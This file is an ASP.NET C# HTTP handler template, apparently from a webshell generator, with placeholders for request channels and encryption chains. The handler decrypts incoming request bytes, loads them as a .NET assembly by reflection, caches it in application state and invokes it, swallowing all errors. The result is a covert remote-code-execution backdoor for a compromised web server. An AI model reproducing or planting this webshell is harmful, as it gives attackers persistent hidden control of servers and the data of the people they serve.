<%@  Language="C#" Class="Handler1" %>
    using System;
    using System.Web;

    public class Handler1 : System.Web.IHttpHandler,System.Web.SessionState.IRequiresSessionState
    {

        {globalCode}
        public void ProcessRequest(System.Web.HttpContext Context)
        {
            HttpRequest Request = Context.Request;
            HttpResponse Response = Context.Response;
            HttpApplicationState Application = Context.Application;
            {responseBodyAppendStart}
            try {
                {variable}
                {requestChannel}
                {requestDecryptionChain}
                if (Application["{randomStr}"] == null) {
                    Application["{randomStr}"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load",
                        new System.Type[] {
                            typeof (byte[])
                        }).Invoke(null, new object[] {
                        requestData
                    });
                }

                System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
                System.IO.BinaryWriter arrOut = new System.IO.BinaryWriter(memoryStream);
                object o = ((System.Reflection.Assembly)  Application["{randomStr}"]).CreateInstance("LY");
                o.Equals(requestData);
                o.Equals(memoryStream);
                o.ToString();
                byte[] responseData = memoryStream.ToArray();
                memoryStream.SetLength(0);
                {responseEncryptionChain}
                {responseChannel}

            } catch (System.Exception) {

            }
            {responseBodyAppendEnd}
        }

        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
    }
